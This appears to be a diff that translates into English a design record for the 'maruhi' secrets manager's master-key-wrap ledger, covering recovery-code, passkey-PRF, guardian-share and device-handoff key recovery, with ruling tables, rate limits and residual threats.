-KL3 = 封印バックアップを CRYPTO_SPEC §8 の一般化として設計する回。仕様改訂の起草時の写しは docs/notes/kl3-spec-drafts.md(CRYPTO_SPEC §8 / AUTH_SPEC §13 / AUDIT_SPEC §3.1)。本補足は設計の全体像・裁定の反復記録・KL2 保留項目の裁定・実装分割・承認依頼項目を持つ。
+- **On-chain multi-signature approval (four-eyes on-chain)**: accept dangerous operations like `grant_server` / `remove_member` only with signatures from 2 owners. Natural since the chain is signed. A strong candidate as the implementation form of the "four-eyes" future item. Spec revision
+- **Public witnessing of chain heads (public witness)**: place the signed head declaration on a user-owned public append log (a git repo etc.), letting third parties detect the server's split view (§14.3-4). An extension of the existing repository anchor. Destinations limited to user-configured ones (consistent with zero telemetry)
+- **The honest availability hole**: both deploy-time re-apply and CI leases depend on the hosted service being up. When maruhi is down, deploys stop. Since the decentralized answer is only the mirror — and that is deferred — state "availability is not guaranteed (G8)" in the threat-model document and back it with a status page
+- One-time sharing (`maruhi share` — HPKE-wrap to the public key of a non-member; the CLI version of Doppler Share), federation with other maruhi servers, offline ciphertext replicas (violates the persistence discipline) — none adopted for now
 
-**承認(2026-09-12)**: 所有者は 19-6 の 13 項目を「各裁定点で銀の弾丸・上位互換案の探索を反復して決めたのであれば従う」として一括承認した。反復の実態は 19-2 / 19-3 の巡数のとおりで、正直に付記すると、項目 2(LP フィールド列の並び)は既存規約(§5.1 / §9.1 の先例)への追随で単巡、項目 8 の数値は既存の線の延長で単巡、項目 11 の順序・項目 12 のゲート範囲・項目 13 の Web 不干渉は判断であって探索の結果ではない(いずれも後から安価に変えられる)。同日 K1 として 3 正本へ反映済み。以降はフェーズ 2(K2 以降)。
+### Supplement 19: KL3 design record — the master-key-wrap ledger (2026-09-12 — phase 1 design session. Owner-approved same day)
 
-#### 19-1. 全体像 — 台帳の構造と受信者
+KL3 = the round that designs sealed backups as a generalization of CRYPTO_SPEC §8. The draft-time copies of the spec revision are in docs/notes/kl3-spec-drafts.md (CRYPTO_SPEC §8 / AUTH_SPEC §13 / AUDIT_SPEC §3.1). This supplement holds the design's overall picture, the iterated rulings record, rulings on KL2's shelved items, the implementation split, and the items submitted for approval.
 
-**問題の再定義**: 今の §8 は「master 鍵ブロブ B を、リカバリーコード由来の KEK 1 つで包んでサーバーに置く」1 経路しかない。KL(キーチェーン不在)・端末移行・保護者リカバリー・パスキー PRF は、いずれも「**B をもう 1 つの受信者へ包む**」問題であり、受信者の型が違うだけである。よって「master 鍵ラップ台帳」= **同じ B に対する、受信者ごとのラップの集合**として一般化する。B(キーチェーンの `StoredMasterKey` レコードの JSON 直列化)・スイート・master 鍵そのものは変えない。
+**Approval (2026-09-12)**: the owner approved all 13 items of 19-6 as "I follow them, provided each ruling point was decided with the silver-bullet / superset search iterated". The actual iteration is as the round counts in 19-2 / 19-3 show; to note honestly, item 2 (the ordering of the LP field tuples) followed existing conventions (precedents in §5.1 / §9.1) in a single round, item 8's numbers extend existing lines in a single round, and items 11's ordering, 12's gate scope, and 13's web non-interference are judgments, not search results (all cheaply changeable later). Reflected to the 3 primary documents as K1 the same day. What follows is phase 2 (K2 onward).
+
+#### 19-1. The whole picture — the ledger's structure and recipients
+
+**Problem re-defined**: today's §8 has only one path — "wrap master-key blob B under a single recovery-code-derived KEK and place it on the server". KL (keychain-absent), device migration, guardian recovery, and passkey PRF are all the problem of "**wrapping B for one more recipient**"; only the recipient's type differs. So we generalize to the "master-key-wrap ledger" = **the set of per-recipient wraps of the same B**. B (the JSON serialization of the keychain's `StoredMasterKey` record), the suite, and the master key itself are unchanged.
 
 ```
-master 鍵ブロブ B(StoredMasterKey の JSON。既存と同一)
+master key blob B (StoredMasterKey JSON. Identical to existing)
 │
-├─ クラス S: 対称 KEK(台帳行 1 = ラップ 1)
-│   ├─ recovery-code  KEK = HKDF(code, salt=空, info="maruhi/v1/recovery")        … 既存 §8 と 1 バイトも変えない
-│   └─ passkey-prf    KEK = HKDF(prf_out, salt=空, info="maruhi/v1/passkey-prf")  … prf_out = WebAuthn PRF(credential, prf_salt〔登録ごとの乱数〕)
-│        ラップ = AES-256-GCM(KEK, B, AAD = LP("maruhi/v1/master-wrap", user_id, kind, wrap_ref, mode))
+├─ class S: symmetric KEK (1 ledger row = 1 wrap)
+│   ├─ recovery-code  KEK = HKDF(code, salt=empty, info="maruhi/v1/recovery")        … not one byte different from existing §8
+│   └─ passkey-prf    KEK = HKDF(prf_out, salt=empty, info="maruhi/v1/passkey-prf")  … prf_out = WebAuthn PRF(credential, prf_salt〔random per registration〕)
+│        wrap = AES-256-GCM(KEK, B, AAD = LP("maruhi/v1/master-wrap", user_id, kind, wrap_ref, mode))
 │
-├─ クラス G: 保護者グループ(台帳行 = グループ 1 + 分片 n)
-│   グループ KEK = 乱数 256-bit。ラップ = 上と同じ AES-GCM(kind = "guardian", wrap_ref = group_id, mode = any|all)
-│   分片: mode=any → 全員 s_i = KEK(誰か 1 人で足りる)/ mode=all → s_1..s_{n-1} 乱数, s_n = KEK ⊕ s_1 ⊕ … ⊕ s_{n-1}(全員が要る)
-│   各分片 = HPKE Seal(保護者 i の enc 公開鍵, s_i, info = LP("maruhi/v1/guardian-wrap", user_id, group_id, mode, share_index, guardian_user_id))
+├─ class G: guardian group (ledger row = 1 group + n shares)
+│   group KEK = random 256-bit. wrap = same AES-GCM as above (kind = "guardian", wrap_ref = group_id, mode = any|all)
+│   shares: mode=any → everyone s_i = KEK (any one suffices) / mode=all → s_1..s_{n-1} random, s_n = KEK ⊕ s_1 ⊕ … ⊕ s_{n-1} (all needed)
+│   each share = HPKE Seal(guardian i's enc public key, s_i, info = LP("maruhi/v1/guardian-wrap", user_id, group_id, mode, share_index, guardian_user_id))
 │
-└─ クラス H: ハンドオフ(一時受信者。台帳に永続行を持たない — §9.1 リースラップと同じ「応答スコープ」)
-    要求者(新端末)が一時 X25519 鍵 E をメモリ内で生成。**ハンドオフコード = Base32(E.pub ‖ checksum)を人が運ぶ**(サーバーは E.pub を中継しない)
+└─ class H: handoff (temporary recipient. Holds no persistent ledger row — the same "response scope" as §9.1 lease wraps)
+    the requester (new device) generates a temporary X25519 key E in memory. **the handoff code = Base32(E.pub ‖ checksum) is carried by a human** (the server does not relay E.pub)
     request_id = lower_hex(SHA-256(LP("maruhi/v1/handoff-id", E_pub_hex)))
-    承認 = HPKE Seal(E.pub, 32 バイト値 v, info = LP("maruhi/v1/handoff-wrap", user_id, request_id, source, share_index, approver_user_id))
-      保護者の承認: v = 自分の分片 s_i(台帳から取得 → 自鍵で Open → **その場で E.pub へ再封印**。source = group_id)
-      旧端末の承認: v = 新規乱数 KEK_h(source = "device", share_index = 0)+ AES-GCM(KEK_h, B, AAD = master-wrap 形〔kind="device", wrap_ref=request_id〕)を同送
-    要求者: v を集めて KEK を復元(any: 1 片 / all: 全片の XOR / device: そのまま)→ B を復号 → importMasterKeys の自己検証 → キーチェーン(または agent メモリ)へ
+    approval = HPKE Seal(E.pub, 32-byte value v, info = LP("maruhi/v1/handoff-wrap", user_id, request_id, source, share_index, approver_user_id))
+      guardian's approval: v = their own share s_i (fetch from ledger → Open with own key → **re-seal on the spot to E.pub**. source = group_id)
+      old device's approval: v = fresh random KEK_h (source = "device", share_index = 0) + AES-GCM(KEK_h, B, AAD = master-wrap form〔kind="device", wrap_ref=request_id〕) sent along
+    requester: gather v's and rebuild the KEK (any: 1 share / all: XOR of all shares / device: as-is) → decrypt B → self-verify via importMasterKeys → into the keychain (or agent memory)
 ```
 
-**受信者と流れの対応表**:
+**Recipients ↔ flows correspondence table**:
 
-| 受信者 | クラス | 登録するもの(誰が・いつ) | 復元の流れ | 本人以外に要る人 |
+| Recipient | Class | What's registered (who, when) | Restore flow | People needed besides the owner |
 |---|---|---|---|---|
-| リカバリーコード | S | 既存どおり(`key generate` / `key recovery`) | 既存どおり `key recover`(GitHub ログイン + コード入力) | なし |
-| パスキー PRF | S | `maruhi key seal passkey`: CLI が配る localhost ページで passkey を作成・PRF を取得 → KEK → ラップ登録(credential_id・prf_salt は公開パラメータとして台帳に併置) | `key recover --passkey`: 台帳のブロブ取得 → localhost ページで PRF 取得(生体認証 1 回)→ 復号 | なし |
-| 保護者(1-of-n / n-of-n) | G | `maruhi guardian add`(ward = 本人): 保護者候補は**共有プロジェクトのチェーン導出メンバー**で、鍵は §6.5 の充足形(儀式 / フラグ / 指紋帳ヒット + yes)で確認したもの | `key recover --handoff` → コードを保護者へ帯域外で渡す → 保護者が `key approve <コード>`(声で本人確認 → 承認)→ 要求者が分片を集めて復号 | 保護者 1 人(any)/ 全員(all) + 本人の GitHub ログイン |
-| 自分の旧端末(端末移行) | H | 登録不要(旧端末が master 鍵を持っている) | 新端末で `key recover --handoff` → コードを旧端末へ(同一人物なのでコピー&ペースト)→ 旧端末で `key approve <コード>` → 新端末が復号 | なし(自分の 2 台) |
+| Recovery code | S | As today (`key generate` / `key recovery`) | `key recover` as today (GitHub login + code entry) | None |
+| Passkey PRF | S | `maruhi key seal passkey`: create the passkey and get the PRF on a localhost page served by the CLI → KEK → register the wrap (credential_id and prf_salt are placed on the ledger as public parameters) | `key recover --passkey`: fetch the ledger blob → get the PRF on the localhost page (one biometric) → decrypt | None |
+| Guardian (1-of-n / n-of-n) | G | `maruhi guardian add` (ward = the owner): guardian candidates are **chain-derived members of shared projects**, with keys confirmed via §6.5's satisfaction forms (ceremony / flag / fingerprint-book hit + yes) | `key recover --handoff` → hand the code to the guardian out-of-band → guardian runs `key approve <code>` (voice-verifies the owner → approves) → requester gathers shares and decrypts | 1 guardian (any) / all (all) + owner's GitHub login |
+| Own old device (device migration) | H | No registration (the old device holds the master key) | On the new device `key recover --handoff` → take the code to the old device (same person, so copy & paste) → on the old device `key approve <code>` → the new device decrypts | None (your own 2 devices) |
 
-**要求者の手順は受信者に依らず 1 本**(`key recover --handoff` は「誰が承認するか」を知らない — 承認は旧端末でも保護者でもよく、届いた承認の source で組み立てる)。承認者側も 1 コマンド(`key approve`: ward = 自分なら端末移行、他人なら保護者承認 — 所属グループが無ければ拒否)。
+**The requester's procedure is a single one regardless of recipient** (`key recover --handoff` doesn't know "who approves" — the approver may be an old device or a guardian; it assembles from the approvals' source). The approver side is also one command (`key approve`: ward = self → device migration, ward = someone else → guardian approval — refused if not in any group).
 
-**KL(キーチェーン不在)との接続**: Codespaces / devcontainer では `maruhi agent -- bash` の中で `key recover --handoff` を実行し、表示されたコードを手元のラップトップの端末へ貼って承認する。鍵は agent のメモリに着地し、コード入力もリカバリーコードも要らない。パスキー PRF は「手元に旧端末が無い」場合(自分 1 台 + 同期パスキー)の経路。
+**Connection to KL (keychain-absent)**: on Codespaces / devcontainer, run `key recover --handoff` inside `maruhi agent -- bash`, paste the displayed code into the terminal of your own laptop for approval. The key lands in the agent's memory — no code entry and no recovery code needed. The passkey PRF is the path for "no old device at hand" (single device + synced passkey).
 
-**§8 との互換**: recovery-code 行は既存の `recovery_wraps` 表・既存の AAD / info・既存のテストベクター(`recovery-wrap.json`)のまま。台帳は「既存行 + 新しい表」の和集合であり、既存ブロブの再ラップ・マイグレーションは無い。
+**Compatibility with §8**: the recovery-code row keeps the existing `recovery_wraps` table, the existing AAD / info, and the existing test vector (`recovery-wrap.json`). The ledger is the union of "existing row + new tables"; there is no re-wrapping or migration of existing blobs.
 
-#### 19-2. 裁定の反復記録
+#### 19-2. Iterated rulings record
 
-各裁定点で「案の列挙 → 上位互換 / 銀の弾丸の探索 → 新案が出なくなるまで」を回した。巡数はその回数。
+At each ruling point we ran "enumerate options → search for a superset / silver bullet → until no new options emerge". The round count is that number.
 
-| 裁定点 | 巡 | 検討した案と評価 | 結論 |
+| Ruling point | Rounds | Options considered and evaluation | Conclusion |
 |---|---|---|---|
-| A. 台帳の構造 | 3 | ① `recovery_wraps` に kind 列を足す(平ら): 保護者の「グループ + 分片」が 1 行に収まらず、既存行の意味が変わる。② **クラス S / G / H の 3 型**(採用): 対称 KEK 行・グループ + 分片・応答スコープの一時受信者。③ 全受信者を HPKE 受信者に統一(パスキーも「PRF から X25519 鍵を決定論導出」): device-key-sealing.md §4 の「PRF 直接導出」と同じ欠点(認証器に不可逆に縛られる)+ 仕様に無い鍵導出。④ 銀の弾丸候補 = **デバイス鍵分離(未決 #2)**: 各端末が固有鍵を持てば「鍵を運ぶ」問題自体が消えるが、§3 / §5 / §6.2 / AUTH の大改訂で、リカバリー(鍵喪失)と ephemeral 環境(その端末の鍵も消える)は解かない — 補完関係であり置換ではない。⑤ 銀の弾丸候補 = 委任 + 転送 agent(KL2 反復記録): 鍵を運ばず遠隔で使う。SSH 経路限定・Web Codespaces で不成立・リカバリーを解かない | ② を採用。④ は将来(未決 #2 のまま)、⑤ は KL4(19-3 (a)(b)) |
-| B. 対称 KEK の導出(パスキー) | 3 | ① HKDF(prf_out, salt=空, info) — §8 と同型(採用)。PRF 出力は 32 バイトの一様乱数で RFC 5869 §3.1 の前提を満たす。② PBKDF2 / Argon2id: 不要(高エントロピー)。パスフレーズ由来は前提どおり不採用。③ PRF の eval 入力(WebAuthn の `prf.eval.first`)を固定文字列にする vs **登録ごとの乱数 prf_salt**(採用): 固定だと KEK が credential の固定関数になり、一度漏れた KEK が再登録後のラップも開く。乱数なら再登録 = 新 KEK で「再発行 → 旧ラップ削除」の意味論が成立する。prf_salt は公開パラメータ(台帳に併置)。④ prf_out をそのまま AES 鍵にする: HKDF を挟むのは用途分離(info)のため。維持 | ① + ③ |
-| C. 保護者の閾値構成 | 4 | ① 1-of-n = 各保護者へ KEK を丸ごと HPKE(採用 = mode any)。② n-of-n = **乱数 XOR 分割**(採用 = mode all。s_n = KEK ⊕ 他)。情報理論的に安全な標準構成で新プリミティブ無し。③ k-of-n Shamir: 制約により不採用。④ HPKE の入れ子(A の鍵で包んだものを B の鍵で包む — 補足 17 の 2-of-2 二重ラップ): n-of-n と同じ効果だが**逐次依存**(B が開いてから A)になり、承認が並列にできず承認者間で中間値を運ぶ経路が要る。XOR は各保護者が独立に自分の分片を要求者へ再封印できる(上位互換 = XOR)。⑤ 1 人の保護者が複数グループに入る・any と all を併用する: 台帳がグループ単位なので自然に可能(グループ ≤ 5、n ≤ 5 の受理ポリシー)。⑥ 銀の弾丸 = 保護者を要らなくする(パスキー同期に頼る): 認証器・エコシステム喪失で詰む。保護者は「人間側の冗長性」で代替不能 | ① + ② + ⑤ |
-| D. ハンドオフ鍵(要求者の一時公開鍵)の運搬 | 4 | ① サーバーが E.pub を中継し、両画面に確認コードを出して照合(補足 17 の当初案)。**短い確認コードは不可**: 一方の鍵を攻撃者(サーバー)が選べるため第二原像探索が 2^N で、§3 の「短縮コードへの切り詰めは行わない」と同じ理由で **12 語**が要る。② ①の 12 語版: 成立するが、儀式(通話で 12 語読み上げ)を新設する。③ ZRTP 型 commit-then-reveal で短縮: 新プロトコル = 禁止。④ QR: 所有者裁定でやらない(リモートで効かない)。⑤ **E.pub 自体を人が運ぶ**(採用): コード = Base32(E.pub 32 B ‖ SHA-256 チェックサム 4 B)≈ 58 文字。サーバーは E.pub を**一度も見ない**ので鍵すり替えの余地が構造的に無く(IV1 の「bind はサーバーに渡らない」と同じ型)、照合儀式が不要になる。運ぶ経路(Slack / 電話 / 自分のクリップボード)が能動的に改竄される脅威は招待リンクと同じ「信頼できる経路で渡す」規律に帰着。保護者は依然「誰から来たコードか」を声で確かめる(なりすまし対策の本体) | ⑤。②は採らない(⑤の下位互換) |
-| E. 承認の payload の形 | 3 | ① B を直接 E.pub へ HPKE(端末移行向け): 保護者経路は分片しか持たないので形が 2 つになる。② **常に「32 バイト値 v を E.pub へ HPKE」+ ブロブは AES-GCM 側**(採用): 端末移行は新規乱数 KEK_h で B をラップして同送、保護者は台帳のグループブロブを要求者が取得。要求者側の組み立て(v を集める → KEK → AES-GCM open)が 1 本になる。③ 承認者が要求者向けの**永続**ラップ行を台帳に登録する: 一時鍵宛の長寿命ラップが残り、E は要求者のプロセスとともに消えるので開けなくなるだけの死骸になる。応答スコープ(TTL 15 分・要求者以外は開けない)が正しい | ② |
-| F. 保護者の公開鍵の出所 | 3 | ① グローバル公開鍵ディレクトリ: §6.5 で禁止(同意なき参照の構造)。② **共有プロジェクトのチェーン導出メンバー + §6.5 の明示確認の充足形**(採用): add_member payload の鍵は招待者が確認したもの。指紋帳(KF)のヒットなら読み上げ免除 + yes、無ければ 12 語儀式 / フラグ。新しい信頼オブジェクトを作らない。③ 招待リンク型の握手(保護者が「保護者受諾」を署名): 保護者の同意を暗号で取れるが、儀式が 1 つ増える。承認は保護者の能動操作なので、同意なし指名でも保護者が困る面は「自分の CLI に ward が表示される」だけ。v1 では省く。④ IV2 の GitHub 署名鍵ディレクトリ: 将来の裏付け元として合成可能(KL3 を変えずに足せる)。⑤ 保護者の鍵更新(`key generate` で別鍵)の追随: 台帳に保護者の FP を併置し、`guardian list` がチェーン導出の現鍵と突合して「stale — 再登録」を警告する(all モードでは 1 人の stale でグループが死ぬため必須の UX) | ② + ⑤。③④は後続 |
-| G. 端末移行の機構 | 2 | ① 「旧端末 = 自分自身が保護者」として事前登録(台帳に device 行): 旧端末は B を持っているので事前登録は無意味で、端末を失ったときに残る行は誰も開けない。② **一時承認バンドル**(採用 — E の ②): 承認時に KEK_h とラップを生成し応答スコープで運ぶ。台帳に行を持たない | ② |
-| H. 保存の形(D1) | 2 | ① 既存 `recovery_wraps` を汎用台帳表へマイグレーション: 既存行の移送とレート制限計数の付け替えが要り、得るものは表の数だけ。② **既存表は据え置き + 新表 4 つ**(採用): `master_key_wraps`(S: passkey-prf)/ `guardian_groups` / `guardian_shares` / `key_handoff_requests` + `key_handoff_approvals`。ブロブ取得のレート制限は**種別合算の user 単位 1 窓**(専用カウンタ行 — `recovery_wraps` の計数列は合算窓へ読み替える) | ② |
-| I. PRF の取得経路 | 3 | ① 運営配信 Web: ADR-0018 と衝突(補足 12 L4-b (i))。② **CLI が配る localhost ページ**(採用 — 補足 12 (ii)): 127.0.0.1 の乱数ポート、URL にワンタイムトークン、Origin 検査、応答は PRF hex の 1 POST のみ、値・鍵素材を DOM に出さない。**CLI 初の TCP リスナー**(ADR-0018 改訂 1・4 項が指摘する localhost の面)。rpId = `localhost`(ポート非依存 → VS Code のポート転送・WSL で成立。**ブラウザ版 Codespaces は転送 URL が github.dev になり rpId 不一致 → `gh codespace ports forward` で手元へ引く案内が要る**)。③ CTAP2 hmac-secret をネイティブ(libfido2 / FFI): プラットフォーム認証器(Touch ID / Windows Hello)に届かず、依存が最大級(device-key-sealing.md §5-2 / -3)。④ 銀の弾丸 = PRF を使わずパスキー**同期**そのものに… 不可(パスキーは秘密を吐かない。PRF が唯一の口)。残余: localhost の任意ページが同じ rpId で儀式を起動できる(ユーザーの同意プロンプトが境界。ブロブは認証済み取得が要るので PRF 単体では無価値)。パスキーマネージャ上の表示名が "localhost" になる(user.displayName に `maruhi · <server host>` を入れて識別) | ②。スパイク K0 を前置(19-4) |
-| J. レート制限・ゲート | 2 | 既存の線を据え置き・拡張: ブロブ取得 = **種別合算 1 時間 5 回 / user**、ハンドオフ要求 5 回 / 時 / user、承認 20 回 / 時 / 承認者、要求 TTL 15 分、承認は要求者以外開けない(E はメモリ)。儀式(承認・PRF・復元)は TTY 3 チャネル + 非エージェント(ADR-0016 決定 7 の既存ゲートをそのまま)。セッション主体は全て拒否(§13-2 と同水準)。銀の弾丸候補 = 「レート制限を要らなくする」: 取得はブロブ持ち出しの試行なので二重防御の線として残す | 据え置き + 拡張 |
-| K. 監査事件 | 2 | 既存 2 事件(recovery_*)は名前を変えない。新規 9 事件(ドラフト参照)。保護者の分片取得・承認は**要監視**(ward の側にも target として現れる)。ハンドオフの「承認を集めた」事件を ward 側に残す(復元が起きた事実) | 採用 |
-| L. IV1 / IV2 との整合 | 1 | KL3 が触るのは §8 / §13(AUTH)/ §3.1(AUDIT)のみで、IV1(§6.5 + AUTH §15)と節が交わらない。保護者の鍵出所は §6.5 の充足形を**参照**するだけなので IV1 で儀式が既定廃止になっても「確認済みの鍵」の定義に追随する。IV2 は F ④ として合成可能。版番号は CRYPTO_SPEC 0.9-draft(KL3)→ 0.10-draft(IV1)の順を仮置き | 妨げなし |
+| A. The ledger's structure | 3 | ① Add a kind column to `recovery_wraps` (flat): a guardian's "group + shares" doesn't fit in one row and changes the meaning of existing rows. ② **3 types: classes S / G / H** (adopted): symmetric-KEK rows, group + shares, response-scoped temporary recipients. ③ Unify all recipients as HPKE recipients (the passkey too, via "deterministically derive an X25519 key from the PRF"): same drawback as device-key-sealing.md §4's "direct PRF derivation" (irreversibly bound to the authenticator) + an off-spec key derivation. ④ Silver-bullet candidate = **device-key separation (open item #2)**: if each device had its own key the "carry the key" problem itself disappears, but it's a large revision of §3 / §5 / §6.2 / AUTH, and it solves neither recovery (key loss) nor ephemeral environments (that device's key disappears too) — complementary, not a replacement. ⑤ Silver-bullet candidate = delegation + forwarding agent (KL2 iteration log): use the key remotely without carrying it. SSH-path-only, doesn't work on Web Codespaces, doesn't solve recovery | Adopted ②. ④ is future (stays open item #2); ⑤ is KL4 (19-3 (a)(b)) |
+| B. Symmetric-KEK derivation (passkey) | 3 | ① HKDF(prf_out, salt=empty, info) — same shape as §8 (adopted). The PRF output is a 32-byte uniform random, satisfying RFC 5869 §3.1's premise. ② PBKDF2 / Argon2id: unnecessary (high entropy). Passphrase-derived stays rejected per premise. ③ Fix the PRF's eval input (WebAuthn's `prf.eval.first`) to a constant string vs **a per-registration random prf_salt** (adopted): fixed, the KEK becomes a fixed function of the credential, so a once-leaked KEK opens wraps made after re-registration. Random means re-registration = new KEK, making "re-issue → delete old wrap" meaningful. prf_salt is a public parameter (placed on the ledger). ④ Use prf_out directly as the AES key: HKDF sits in between for purpose separation (info). Kept | ① + ③ |
+| C. Guardians' threshold construction | 4 | ① 1-of-n = HPKE the whole KEK to each guardian (adopted = mode any). ② n-of-n = **random XOR split** (adopted = mode all. s_n = KEK ⊕ others). An information-theoretically secure standard construction with no new primitive. ③ k-of-n Shamir: rejected by constraint. ④ Nested HPKE (wrap under A's key, then wrap that under B's — supplement 17's 2-of-2 double wrap): same effect as n-of-n but **sequential dependency** (B opens first, then A); approvals can't run in parallel and a path to carry intermediate values between approvers is needed. With XOR each guardian independently re-seals their share to the requester (superset = XOR). ⑤ One guardian in multiple groups, mixing any and all: naturally possible since the ledger is per-group (acceptance policy: groups ≤ 5, n ≤ 5). ⑥ Silver bullet = eliminate guardians (rely on passkey sync): fails on authenticator / ecosystem loss. Guardians are "human-side redundancy" — irreplaceable | ① + ② + ⑤ |
+| D. Carrying the handoff key (the requester's temporary public key) | 4 | ① The server relays E.pub and a confirmation code is compared on both screens (supplement 17's initial idea). **A short confirmation code is not viable**: since one side's key can be chosen by the attacker (the server), second-preimage search is 2^N — the same reason as §3's "no truncation to short codes", so **12 words** are needed. ② The 12-word version of ①: works, but creates a new ceremony (read out 12 words on a call). ③ Shorten via ZRTP-style commit-then-reveal: a new protocol = forbidden. ④ QR: rejected by owner ruling (doesn't work remotely). ⑤ **A human carries E.pub itself** (adopted): the code = Base32(E.pub 32 B ‖ SHA-256 checksum 4 B) ≈ 58 characters. Since the server **never sees** E.pub, there's structurally no room to swap keys (same type as IV1's "bind never reaches the server"), and no comparison ceremony is needed. The threat of the carrying path (Slack / phone / your own clipboard) being actively tampered reduces to the same "hand it over a trusted path" discipline as invite links. The guardian still voice-verifies "whose code this came from" (the body of impersonation defense) | ⑤. ② is not taken (a subset of ⑤) |
+| E. Shape of the approval payload | 3 | ① HPKE B directly to E.pub (for device migration): the guardian path only holds shares, so the shape splits in two. ② **Always "HPKE a 32-byte value v to E.pub" + the blob goes on the AES-GCM side** (adopted): device migration wraps B under a fresh random KEK_h and sends it along; for guardians the requester fetches the group blob from the ledger. The requester's assembly (gather v → KEK → AES-GCM open) becomes a single path. ③ The approver registers a **persistent** wrap row for the requester on the ledger: a long-lived wrap to a temporary key remains, and since E disappears with the requester's process it becomes an unopenable dead row. Response scope (TTL 15 min, openable by none but the requester) is correct | ② |
+| F. Source of guardians' public keys | 3 | ① A global public-key directory: forbidden by §6.5 (a structure of unconsented reference). ② **Chain-derived members of shared projects + §6.5's satisfaction forms for explicit confirmation** (adopted): the key in an add_member payload is one the inviter verified. On a fingerprint-book (KF) hit, exempt the readout + yes; otherwise the 12-word ceremony / flag. Creates no new trust object. ③ An invite-link-style handshake (the guardian signs a "guardian acceptance"): the guardian's consent is cryptographically captured, but adds one ceremony. Since approval is the guardian's active operation anyway, the only harm of naming without consent is "a ward shows up in their CLI". Omitted in v1. ④ IV2's GitHub signing-key directory: composable as a future backing source (can be added without changing KL3). ⑤ Following guardian key updates (`key generate` to a different key): co-locate the guardian's FP on the ledger; `guardian list` compares against the chain-derived current key and warns "stale — re-register" (mandatory UX in all mode, where one stale guardian kills the group) | ② + ⑤. ③④ are follow-ups |
+| G. Device-migration mechanism | 2 | ① Pre-register "old device = self as guardian" (a device row on the ledger): pointless since the old device already holds B, and the row left when the device is lost can't be opened by anyone. ② **Temporary approval bundle** (adopted — E's ②): at approval time, generate KEK_h and the wrap and carry them in response scope. No ledger row | ② |
+| H. Storage form (D1) | 2 | ① Migrate the existing `recovery_wraps` to a generic ledger table: requires moving existing rows and re-attaching rate-limit counters; gains only a table count. ② **Keep the existing table + 4 new tables** (adopted): `master_key_wraps` (S: passkey-prf) / `guardian_groups` / `guardian_shares` / `key_handoff_requests` + `key_handoff_approvals`. Blob-fetch rate limit is **a per-user combined-across-kinds single window** (a dedicated counter row — `recovery_wraps`' counter column is reinterpreted as part of the combined window) | ② |
+| I. How the PRF is obtained | 3 | ① Operator-hosted web: collides with ADR-0018 (supplement 12 L4-b (i)). ② **A localhost page served by the CLI** (adopted — supplement 12 (ii)): random port on 127.0.0.1, one-time token in the URL, Origin check, response is a single POST of the PRF hex; no values or key material in the DOM. **The CLI's first TCP listener** (the localhost surface pointed out by ADR-0018 revision 1, item 4). rpId = `localhost` (port-independent → works under VS Code port-forwarding and WSL. **For browser Codespaces the forwarded URL becomes github.dev → rpId mismatch → needs guidance to pull it local via `gh codespace ports forward`**). ③ Native CTAP2 hmac-secret (libfido2 / FFI): can't reach platform authenticators (Touch ID / Windows Hello) and is maximum dependency (device-key-sealing.md §5-2 / -3). ④ Silver bullet = rely on passkey **sync** itself without PRF… impossible (a passkey emits no secret; PRF is the only outlet). Residual: any localhost page can start the ceremony under the same rpId (the user's consent prompt is the boundary; the blob needs authenticated fetch so the PRF alone is worthless). The passkey manager shows the name "localhost" (put `maruhi · <server host>` in user.displayName for identification) | ②. Spike K0 first (19-4) |
+| J. Rate limits / gates | 2 | Keep and extend the existing lines: blob fetch = **combined 5 per hour per user**, handoff requests 5/hour/user, approvals 20/hour/approver, request TTL 15 min, approvals openable only by the requester (E is in memory). Ceremonies (approval, PRF, restore) get TTY 3 channels + non-agent (ADR-0016 decision 7's existing gate as-is). Session principals refused across the board (same level as §13-2). Silver-bullet candidate = "make rate limits unnecessary": fetch is a blob-exfiltration attempt, so the limit stays as a defense-in-depth line | Kept + extended |
+| K. Audit events | 2 | The existing 2 events (recovery_*) keep their names. 9 new events (see the draft). Guardian share-fetch and approvals are **must-watch** (they also appear as target on the ward's side). The handoff "approvals collected" event is recorded on the ward side (the fact that a restore happened) | Adopted |
+| L. Consistency with IV1 / IV2 | 1 | KL3 touches only §8 / §13 (AUTH) / §3.1 (AUDIT); the sections don't cross IV1's (§6.5 + AUTH §15). The guardian key source only **references** §6.5's satisfaction forms, so even if IV1 retires the ceremony by default it follows the "verified key" definition. IV2 is composable as F's ④. Version numbers provisionally ordered CRYPTO_SPEC 0.9-draft (KL3) → 0.10-draft (IV1) | No interference |
 
-**設計の上限確認(反復の打ち止め)**: 各裁定点で最後の巡に新案が出なかった。全体として「§8 の構造(HKDF + AEAD、AAD 束縛)+ §5 / §9.1 の HPKE 単発 Seal + XOR」だけで構成でき、**新しいプリミティブ・新しいプロトコルは無い**(XOR 分割は情報理論的秘密分散の標準形で、§5.2 の SHA-256 コミットメントと同じ「既存部品の適用」の位置づけ)。仕様に無い暗号操作が必要になる箇所は見つからなかった。
+**Upper-bound check of the design (enumeration closed)**: no new options emerged in the last round of each ruling point. Overall the construction uses only "§8's structure (HKDF + AEAD, AAD binding) + §5 / §9.1's single-shot HPKE Seal + XOR", and **there are no new primitives or new protocols** (XOR splitting is the standard form of information-theoretic secret sharing — same category as §5.2's SHA-256 commitment, "applying existing parts"). No site needing an off-spec crypto operation was found.
 
-**脅威と残余(脅威モデル文書へ写す候補)**: (1) 保護者(any なら 1 人)+ 本人アカウントの奪取者の共謀で復元できる — 保護者は「その相手」として信頼する(all で緩和)。(2) 本人アカウントの奪取者が保護者へなりすまして承認を得る — 声の本人確認が境界(サーバーは証明できない)。(3) ハンドオフコードの経路が能動改竄されると別鍵へ承認が向く — 招待リンクと同じ「信頼できる経路」規律。改竄された E.pub の承認は攻撃者が開けるが、攻撃者は要求者として ward のアカウント認証も要る(ブロブ取得・承認取得は ward 認証必須)。(4) パスキー: localhost の任意ページによる儀式起動(同意プロンプトが境界)。(5) 保護者・旧端末の機械は分片 / B を承認の瞬間だけメモリに持つ(保存しない)。
